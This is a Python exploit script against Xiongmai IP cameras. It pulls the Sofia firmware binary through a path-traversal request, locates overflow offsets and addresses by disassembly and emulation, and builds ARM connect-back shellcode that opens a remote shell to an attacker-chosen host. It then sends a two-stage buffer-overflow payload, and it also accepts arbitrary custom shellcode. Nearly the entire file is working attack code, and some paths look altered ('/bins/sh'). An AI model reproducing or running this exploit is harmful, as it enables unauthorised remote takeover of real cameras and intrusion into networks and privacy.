#!/usr/bins/python
import argparse, re, struct
import urllib2, httplib, sys
import socket
import capstone
from capstone import *
from capstone.arm import *
from unicorn import *
from unicorn.arm_const import *
from keystone import *

ks_arch = keystone.KS_ARCH_ARM
ks_mode = keystone.KS_MODE_ARM
ks = keystone.Ks(ks_arch, ks_mode)

md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
md.detail = True

def GetFileByPathTraversal(victim_ip, victim_port, file_path):
    try:
        host = 'http://{host_ip}:{host_port}'.format(host_ip=victim_ip, host_port=victim_port)
        httplib.HTTPConnection._http_vsn = 10
        httplib.HTTPConnection._http_vsm_str = 'HTTP/1.0'
        file_buffer = urllib2.urlopen(host + '/../../../../../' + file_path).read()
        print file_buffer[0:40]
        with open("/tmp/Sofia.bins", 'w+') as f:
            f.write(file_buffer)
        return file_buffer
    except IOError as e:
        print e
        # print sys.exc_info()[0]
        return None

# =====================================================================================================================
bias_value = 0
stack_addr = 0x1000
init_sp= stack_addr + 4*1024
ins_count = 0

def hook_code(uc, address, size, user_data):
    global ins_count
    global bias_value

    ins_buf = uc.mem_read(address, size)
    # init disassembler
    if size == 2:
        md = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
    else:
        md = Cs(CS_ARCH_ARM, CS_MODE_ARM)

    s = ''
    for c in ins_buf:
        s += '%02x ' % c

    insn = md.disasm(str(ins_buf), size)
    md.detail = True
    for i in insn:
        # check to confirm that is my 'mov r2, r2' command
        if i.mnemonic == 'mov' and len(i.operands) == 2 and i.operands[0].type==ARM_OP_REG and i.operands[0].reg==ARM_REG_R2 and i.operands[1].type==ARM_OP_REG and i.operands[1].reg==ARM_REG_R2:
            r1 = uc.reg_read(UC_ARM_REG_R1)
            r2 = uc.reg_read(UC_ARM_REG_R2)
            if r1 == 0 and r2 == 0x80:
                bias_value = uc.reg_read(UC_ARM_REG_R0) - init_sp
                uc.emu_stop()
        # debug
        # if size == 2:
        #     sys.stdout.write('%02X %02X           |T ' % (ins_buf[0], ins_buf[1]));
        # else:
        #     sys.stdout.write('%02X %02X %02X %02X |  ' % (ins_buf[0], ins_buf[1], ins_buf[2], ins_buf[3]));

        # print "0x%08x %s\t%s" % (address - 0x3E0000 + 0x003E0464, i.mnemonic, i.op_str)
    ins_count += 1

def emul_code(buf,start_addr):
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    cs = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    code = ''   
    cs.detail = True
    for insn in cs.disasm(buf, start_addr):
        if 'beq' in insn.mnemonic or insn.mnemonic == 'ldr':
            encoding, _ = ks.asm('mov r0, r0', insn.address)
            code +=''.join(chr(e) for e in encoding)
        elif 'bl' in insn.mnemonic:
            encoding, _ = ks.asm('mov r2, r2', insn.address)
            code +=''.join(chr(e) for e in encoding)
        else:
            code += str(insn.bytes)

    # unicorn emulator init
    mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)
    mu.mem_map(start_addr, 8 * 1024)        # mapping code memory section
    mu.mem_write(start_addr, code)
    mu.hook_add(UC_HOOK_CODE, hook_code)    # tracing all instructions with customized callback
    mu.mem_map(stack_addr, 8 * 1024)        # mapping stack memory section
    mu.reg_write(UC_ARM_REG_SP, init_sp)

    mu.emu_start(start_addr, start_addr + len(code))
    bias = bias_value
    return bias

def hexbytes(insn):
    b = buffer(insn.bytes)
    if len(insn.bytes) == 4:
        return "0x%08x" % (struct.unpack_from('I', b))
    elif len(insn.bytes) == 2:
        return "0x%04x" % (struct.unpack_from('H', b))
    raise 'Unknown instruction lenght?!'

def PrintOperands(insn):
    print "0x%08x: %-10s %s %s" % (insn.address, hexbytes(insn), insn.mnemonic, insn.op_str)
    print("\tNumber of operands: %u" %len(insn.operands))
    c = -1
    for i in insn.operands:
        c += 1
        if i.type == capstone.arm.ARM_OP_REG:
            print("\t\toperands[%u].type: REG = %s" %(c, insn.reg_name(i.value.reg)))
        if i.type == capstone.arm.ARM_OP_IMM:
            print("\t\toperands[%u].type: IMM = 0x%x" %(c, i.value.imm))
        if i.type == capstone.arm.ARM_OP_CIMM:
            print("\t\toperands[%u].type: C-IMM = %u" %(c, i.value.imm))
        if i.type == capstone.arm.ARM_OP_FP:
            print("\t\toperands[%u].type: FP = %f" %(c, i.value.fp))
        if i.type == capstone.arm.ARM_OP_MEM:
            print("\t\toperands[%u].type: MEM" %c)
            if i.value.mem.base != 0:
                print("\t\t\toperands[%u].mem.base: REG = %s" \
                    %(c, insn.reg_name(i.value.mem.base)))
            if i.value.mem.index != 0:
                print("\t\t\toperands[%u].mem.index: REG = %s" \
                    %(c, insn.reg_name(i.value.mem.index)))
            if i.value.mem.disp != 0:
                print("\t\t\toperands[%u].mem.disp: 0x%x" \
                    %(c, i.value.mem.disp))
        if i.shift.type != capstone.arm.ARM_SFT_INVALID and i.shift.value:
            print("\t\t\tShift: type = %u, value = %u" \
                %(i.shift.type, i.shift.value))
    

# virtual address base of the binary
vdiff = 0x8000
VA2FileOffset = lambda address: address - vdiff
FileOffset2VA = lambda file_offset: file_offset + vdiff

def ExtractBinaryInfo(sofia_buffer):
    global g_address_return, g_stack_count, g_address_loader

    c = sofia_buffer
    g_parent_function_address = 0
    g_overflow_function_address = 0
    
    # RegEx pattern to find start of parent function
    pattern = b'\xF0\x4F\x2D\xE9(.{0}(.{4})?)\x42\xDD\x4D\xE2'
    ite = re.finditer(pattern, c)
    list_address = [m.start(0) for m in ite]

    if len(list_address) == 0:
        print "Failed: cannot find matched pattern"
        return -1

    is_found = False
    for address in list_address:
        g_parent_function_address = address
        code = c[g_parent_function_address:g_parent_function_address+0x300]
        list_parent_function_instruction = []
        for insn in md.disasm(code, g_parent_function_address+vdiff):
            list_parent_function_instruction.append(insn)
        
        count_parent_instruction = len(list_parent_function_instruction)
        g_address_return = 0
        for index in range(0, len(list_parent_function_instruction)-10):
            insn = list_parent_function_instruction[index]
            if index < count_parent_instruction and list_parent_function_instruction[index].mnemonic == 'bl':
                if index + 3 < count_parent_instruction and list_parent_function_instruction[index+3].mnemonic == 'bl':
                    if index + 6 < count_parent_instruction and list_parent_function_instruction[index+6].mnemonic == 'bl':
                        if index + 8 < count_parent_instruction and list_parent_function_instruction[index+8].mnemonic == 'bl': 
                            is_found = True
                            g_address_return = list_parent_function_instruction[index+6].address + 4
                            # PrintOperands(list_parent_function_instruction[index+8])
                            g_overflow_function_address = list_parent_function_instruction[index+6].operands[0].value.imm
                            break
        if is_found == True:
            break

    if is_found == False:
        print "Failed: cannot find the g_address_return"
        return -1

    code = c[VA2FileOffset(g_overflow_function_address):VA2FileOffset(g_overflow_function_address)+0x600]
    list_parent_function_instruction = []
    for insn in md.disasm(code, g_overflow_function_address):
        list_parent_function_instruction.append(insn)
        # print "0x%08x: %-10s %s %s" % (insn.address, hexbytes(insn), insn.mnemonic, insn.op_str)

    # get stack count from instruction: 'sub sp, sp, #0x120'
    # g_stack_count = list_parent_function_instruction[1].operands[2].value.imm
    g_stack_count = emul_code(c[VA2FileOffset(g_overflow_function_address):VA2FileOffset(g_overflow_function_address)+0x200], 0x3E0000)
    if g_stack_count == 0: 
        print "Failed: cannot find stack count"
        return -1 

    '''
    # get address of loader
    + heuristic theo cach: 
        - tim lenh 'ADD R0, R[x], #0x14' + ngay sau la lenh 'bl'
        - tim nguoc len den khi gap lenh 'LDR R[x], IMM'
    + heuristic 2:
        - tim lenh 'ADD R0, R[x], #0x14' + ngay sau la lenh 'bl'
        - tim nguoc len den khi gap lenh 'movw R[x], IMM' va 'movt R[x], IMM'    
    '''
    is_found = False
    g_address_loader = 0
    for index in range(0, len(list_parent_function_instruction)):
        used_register = ''
        current_insn = list_parent_function_instruction[index]
        if current_insn.mnemonic == 'add' and len(current_insn.operands) == 3 and current_insn.operands[2].value.imm == 0x14: 
            next_insn = list_parent_function_instruction[index+1]
            if next_insn.mnemonic == 'bl':
                used_register = current_insn.reg_name(current_insn.operands[1].value.reg)
                is_found_movw = False
                is_found_movt = False
                temp_address2 = 0
                temp_address = 0
                for index2 in range(index, 0, -1):
                    current_insn2 = list_parent_function_instruction[index2]
                    if current_insn2.mnemonic == 'ldr' and current_insn2.reg_name(current_insn2.operands[0].value.reg) == used_register:  
                        is_found = True
                        temp_address = current_insn2.address + current_insn2.operands[1].value.mem.disp + 8 - vdiff
                        temp_address = struct.unpack('<I', c[temp_address:temp_address+4])[0]
                        g_address_loader = temp_address
                        break
                    if current_insn2.mnemonic == 'movw' and current_insn2.reg_name(current_insn2.operands[0].value.reg) == used_register:  
                        is_found_movw = True
                        temp_address2 += current_insn2.operands[1].value.imm
                    if current_insn2.mnemonic == 'movt' and current_insn2.reg_name(current_insn2.operands[0].value.reg) == used_register:  
                        is_found_movt = True
                        temp_address2 += current_insn2.operands[1].value.imm << 16
                    if is_found_movt and is_found_movw:
                        is_found = True
                        g_address_loader = temp_address2
                        break

    if is_found == False:
        print "Failed: cannot find the g_address_loader"
        return -1

    g_stack_count = int(hex(g_stack_count)[1:][:-1], 16)
    print '''
    address return = {}
    stack count = {}
    address loader = {}
    '''.format(hex(g_address_return), hex(g_stack_count), hex(g_address_loader))
    return 1
    
# =====================================================================================================================    
def Ip2Int(addr):                                                               
    return struct.unpack("!I", socket.inet_aton(addr))[0]  

def BuildConnectbackShellcode(connectback_ip, connectback_port, address_return):
    connectback_port = struct.unpack('>H',struct.pack('<H',int(connectback_port, 10)))[0]
    connectback_ip = struct.unpack('>I',struct.pack('<I',Ip2Int(connectback_ip)))[0]

    nop_command = '\tsub r4, r4, r4\n'*24
    connectback_shellcode_asm = '''
        sub r0, r0, r0
        sub r1, r1, r1
        sub r2, r2, r2
        sub r3, r3, r3
        sub r4, r4, r4
        sub r4, r4, r4
    {nop_command}
        sub r4, r4, r4
        sub r5, r5, r5
        sub r6, r6, r6
        sub r7, r7, r7

        mov r7, #2
        svc 0
        cmp r0, 0
        beq continue

        /* parent */
        /*add sp, sp, #4*/
        adr r1, return_address
        ldr r1, [r1]
        push {{ r1 }}
        pop {{ pc }}
    return_address:
        .word {return_address}
        b exit
    continue:
        mov r0, #2
        mov r1, #1
        sub r2, r2, r2
        /* socket */
        adr r7, socket_syscall_id
        ldr r7, [r7]
        /* movw r7, #281 */
        svc 0
        adr r1, sockaddr_1
        mov r2, #16
        mov r6, r0
        b after_sockaddr_2
        sub r1, r1, r1
    sockaddr_1:
        .short 0x2
        .short {connectback_port}
        .word  {connectback_ip}

    after_sockaddr_2:
        /* connect */
        adr r7, connect_syscall_id
        ldr r7, [r7]
        svc 0
        mov r9, r6
        mov r8, #2
    loop_2:
        mov r0, r9
        mov r1, r8
        mov r7, #63
        svc 0
        adds r8, #-1
        bpl loop_2

        adr r0, bin_sh_1
        mov r2, #0
        push {{r0, r2}}
        mov r1, sp
        mov r7, #11
        svc 0
    exit:
        sub r0, r0, r0
    socket_syscall_id:
        .word 281
    connect_syscall_id:
        .word 283
    bin_sh_1:
        .asciz "/bins/sh"
    '''.format(nop_command=nop_command, return_address=hex(address_return)[:-1], connectback_port=connectback_port, connectback_ip=connectback_ip)
    print connectback_shellcode_asm
    connectback_shellcode, count = ks.asm(connectback_shellcode_asm)
    connectback_shellcode = ''.join(map(chr, connectback_shellcode))

    return connectback_shellcode

def BuildLoaderShellcode(return_address):
    padding = return_address
    print padding
    if padding <= 0x100:
        jump_offset1 = 1
        jump_offset2 = 2
    else:
        jump_offset1 = padding/256
        jump_offset2 = padding-0x100

    loader_code_asm = """
        sub r4, r4, r4
        sub r4, r4, r4
        mov r1,sp
        mov r3,#{jump_offset1}
        lsl r3,r3,#8
        add r3,r3,#{jump_offset2}
        add pc,r1,r3
        sub r4, r4, r4
        sub r4, r4, r4
    """.format(jump_offset1=str(jump_offset1), jump_offset2=str(jump_offset2))
    g_loader_shellcode, count = ks.asm(loader_code_asm)
    g_loader_shellcode = ''.join(map(chr, g_loader_shellcode))

    return g_loader_shellcode

def exploit(victim_ip, victim_port, shellcode, stack_count):
    # 1st request: setup loader shellcode 
    padding = stack_count
    print padding
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientsocket.connect((victim_ip, victim_port))
    print len(g_loader_shellcode)
    ex = "command=login&username="+ g_loader_shellcode[0:20] + "&password=" + g_loader_shellcode[20:] +" "
    payload = "GET /"+ex + " HTTP/1.1\r\n"
    clientsocket.send(payload)
    respond_raw = clientsocket.recv(1024).strip()
    print respond_raw
    clientsocket.close()

    # 2nd request: send exploit buffer + shellcode
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientsocket.connect((victim_ip, victim_port))
    loader_addr = struct.pack("<I",g_address_loader)
    print len(shellcode)
    payload = "http "+"A"*(padding - 13)+ loader_addr + shellcode +'\0'*20 + "\r\n"
    clientsocket.send(payload)
    respond_raw = clientsocket.recv(1024).strip()
    print respond_raw
    clientsocket.close()

# Parse argument ...
parser = argparse.ArgumentParser(description='Xiongmai ipcam exploit')
parser.add_argument('-i','--ip', help='IP of victim\'s IPCam',required=True, dest='victim_ip')
parser.add_argument('-p','--port',help='Port of victim\'s IPCam', required=True, dest='victim_port')
parser.add_argument('-sp','--sofia-path',help='Path of Sofia binary', required=False, dest='sofia_path', default='/var/Sofia')

subparsers = parser.add_subparsers( title='Set shellcode\'s type', 
                                    help='Type of used shellcode')

parser_connectback = subparsers.add_parser('connectback-shell')
parser_connectback.set_defaults(which='connectback-shell')
parser_connectback.add_argument('--host', required=True, dest='connectback_ip', help='IP of connect back host')
parser_connectback.add_argument('--port', required=True, dest='connectback_port', help='Port of connect back host')

parser_custom = subparsers.add_parser('custom-shell')
parser_custom.set_defaults(which='custom-shell')
parser_custom.add_argument('--binary', required=True, dest='shellcode_path', help='Full path of shellcode file')

args = parser.parse_args()

g_victim_ip = args.victim_ip
g_victim_port = int(args.victim_port)
g_sofia_path = args.sofia_path
if args.which == 'connectback-shell':
    g_connectback_ip = args.connectback_ip
    g_connectback_port = args.connectback_port
elif args.which == 'custom-shell':
    g_shellcode_path = args.shellcode_path

print '[+] Get sofia binary file by path traversal vuln'
g_sofia_buffer = GetFileByPathTraversal(g_victim_ip, g_victim_port, g_sofia_path)
if g_sofia_buffer == None:
    print 'Failed: cannot get binary file by path traversal vuln '
    exit()

print '[+] Extracting 3 values from the sofia binary'
result = ExtractBinaryInfo(g_sofia_buffer)
if result == -1: 
    print 'Failed: cannot extract 3 values from binary '
    exit()

print '[+] Building shellcode'
if args.which == 'connectback-shell':
    g_loader_shellcode = BuildLoaderShellcode(g_stack_count)
    g_shellcode = BuildConnectbackShellcode(g_connectback_ip, g_connectback_port, g_address_return)
elif args.which == 'custom-shell':
    g_loader_shellcode = BuildLoaderShellcode(g_stack_count)
    g_shellcode = open(args.shellcode_path).read()

# enjoy shell ......
print '[+] Exploit ... '
exploit(g_victim_ip, g_victim_port, g_shellcode, g_stack_count)
